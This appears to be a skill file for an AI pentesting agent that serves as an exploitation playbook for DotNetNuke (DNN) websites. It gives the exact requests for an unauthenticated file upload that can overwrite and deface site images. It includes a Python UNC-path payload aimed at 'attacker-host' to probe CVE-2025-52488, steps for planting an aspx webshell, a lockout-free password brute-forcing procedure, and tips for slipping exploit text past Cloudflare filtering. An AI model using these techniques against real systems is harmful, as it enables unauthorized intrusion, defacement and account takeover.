---
name: dnn-attack-surface
description: Use when target runs DNN or ASP.NET postback login.
---

# DNN Attack Surface Playbook

## When to Use

Trigger when any of these match:
- Target HTML/JS reveals DNN fingerprints: `/Resources/libraries/DnnPlugins/`, `/DesktopModules/`,
  `/Portals/_default/`, `cdv=` cache marker (e.g. `DnnPlugins/09_13_09`).
- Target returns DNN-style signals: `.ASPXANONYMOUS` cookie, `dnn_IsMobile`, `TT_*.aspx` custom
  module endpoints, `Liink.CMS` namespaces in stack traces.
- An ASP.NET WebForms app needs programmatic login via `__doPostBack` / VIEWSTATE tokens.
- Target exposes `DNNConnect.CKE` (CKEditor provider) — CVE-2025-64095 applies.

Class-level methodology for DotNetNuke (DNN) / dnnsoftware targets. The bundled `dnn-pentest` skill
in `network-services-pentesting/pentesting-web/dotnetnuke-dnn/` covers CVE enumeration basics; this
skill is the hands-on exploitation playbook that complements it.

## 1. Exact version fingerprint (better than cdv / X-DNN)

```
/Resources/libraries/DnnPlugins/<MAJ>_<MIN>_<REV>/dnn.jquery.js?cdv=NNN
```
Example: `DnnPlugins/09_13_09` → DNN 9.13.9 exactly. Works even when `Install/Install.aspx` and
`X-DNN` header are stripped. Confirm by grepping source HTML for `DnnPlugins/\d+_\d+_\d+`.

## 2. CVE-2025-64095 — Unauthenticated arbitrary image file upload

**Endpoint (works unauthenticated):**
```
POST /Providers/HtmlEditorProviders/DNNConnect.CKE/Browser/FileUploader.ashx
```
**All 5 multipart form fields must be present** (missing fields → NullReferenceException 500 which
looks like the server crashed — it's not a crash signal, it's "your body was malformed"):
```
file=<X.png;type=image/png>
storageFolderID=1
portalID=0
overrideFiles=1
mode=Default
```

**Success response** (200, `text/plain`):
```json
[{"group":null,"name":"X.png","type":"image/png","size":22,"progress":"1.0","url":"/FileTransferHandler.ashx?f=X.png","thumbnail_url":null,"delete_url":null,"delete_type":null,"error":null}]
```

**File publicly accessible at `/Portals/_default/<filename>`** — verify with GET (expect 200 + size
match from JSON).

### Live-verified capabilities
- **OVERWRITE**: same filename + `overrideFiles=1` replaces content (22B → 608B confirmed live).
  Any PNG/JPG/GIF/ICO in `/Portals/_default/` is defaceable without auth.
- **Folder mapping**: `storageFolderID=1` is the only value that writes to a web-served root.
  F=2–30 return success JSON but files land in non-web paths; F≥50 → `Value cannot be null`;
  F≈99 → NRE 500.
- **Whitelist blocks RCE**: only `png, jpg, jpeg, gif, bmp, ico` accepted. All others rejected
  (`Permissions are not met. The file has not been added.`). Double-ext variants rewrite the name;
  `;` variants blocked with dots→underscores; null byte → `Illegal characters in path.`; path/abs
  prefixes stripped to basename; case variants blocked.

### Error triage
| Message | Meaning |
|---|---|
| `Object reference not set to an instance of an object.` | multipart body missing form fields, not a crash |
| `Permissions are not met.` | extension whitelist rejection |
| `The file name '\x\y' is not allowed` | forbidden chars / UNC detection |
| JSON with `progress:1.0` | file physically written |

## 3. CVE-2025-52488 hunting variant — Unicode normalization timing oracle

Filename with fullwidth reverse solidus (U+FF3C) normalizes to `\` on Windows before I/O:
```python
payload = chr(0xFF3C)*2 + "attacker-host" + chr(0xFF3C)*2 + "c$" + chr(0xFF3C)*2 + "an.jpg"
```

Expected outcomes on a target:
- **500 + `The file name '\\host\c$\an.jpg' is not allowed`** = Unicode normalization is active,
  CVE-2025-52488 applies (Windows attempted path resolution before rejection).
- **Timing oracle**: UNC-shaped filename → ~3.5s vs ~1.0s for same endpoint with normal filename.
  Windows called into SMB path resolution. **No OOB/SMB callback** required for evidence of
  applicability — capture the timing delta.
- Payload edit: Python `chr(0xFF3C)` repeated; send with hand-built multipart — cURL `-F filename=`
  mangles certain Unicode chars.
- ASCII `\\host\share\an.jpg` → 200 upload but name collapses to `an_N.jpg` (local write wins, UNC
  stripped, no callback).

## 3a. RCE via post-upload (requires admin or another vector)
Per the bundled skill: after admin access, enable `aspx` in `Settings → Security → More → More
Security Settings` → Allowable File Extensions; then upload webshell to `/admin/file-management`
→ `/Portals/0/shell.aspx`.

## 4. DNN ASP.NET postback login brute-forcing (Python)

**Key gotcha:** `__EVENTTARGET` must be `dnn$ctr$Login$Login_DNN$cmdLogin` — not empty.
Empty value → 302 `?error=An unexpected error has occurred` which superficially looks like a
VIEWSTATE failure (false-positive).

Per attempt:
1. Fresh GET `/login` → parse `__VIEWSTATE`, `__VIEWSTATEGENERATOR`, `__EVENTVALIDATION`.
2. Keep a cookie jar holding `.ASPXANONYMOUS` + `ASP.NET_SessionId` freshly issued with that request.
3. POST with `__EVENTTARGET=dnn$ctr$Login$Login_DNN$cmdLogin`.
4. Success detection: `'Log Out'` or `'Logoff'` in response body.

**No lockout / captcha** observed after 60+ continuous attempts — brute-force practical at
~3s/attempt sequential, 4–8 parallel threads without lockout observed. Slight per-user response
size variances (46827/46828/...) are NOT enum signal — skip.

## 5. Notion reporting when API sits behind Cloudflare

Large markdown payloads with `<script`, path-traversal samples, or exploit-chain words get
**403 Forbidden from Cloudflare** at `api.notion.com` (which superficially looks like a Notion
validation error). Workarounds (live-tested):
1. Create the page with a plain title via `POST /v1/pages`.
2. Split content into paragraph blocks ≤ 800 chars text; append via
   `PATCH /v1/blocks/{page_id}/children` in batches of ~10 blocks. 20-block batches with 1000-char
   cells intermittently 403; 10×800-char consistent.
3. Literal `<script src=...>` inside code fences alone triggers 403 → sanitize first.
4. Pass JSON bodies via `-d @/tmp/x.json` (inline `key=value` parsing breaks on multi-line content).
5. `.sh` files rejected by File Upload API; use text/markdown.

## References

- `references/dnn-cke-unauth-upload-postback-notion.md` — session-verified detail of the above
  techniques including live-test transcripts from a locked-down DNN 9.13.9 target.
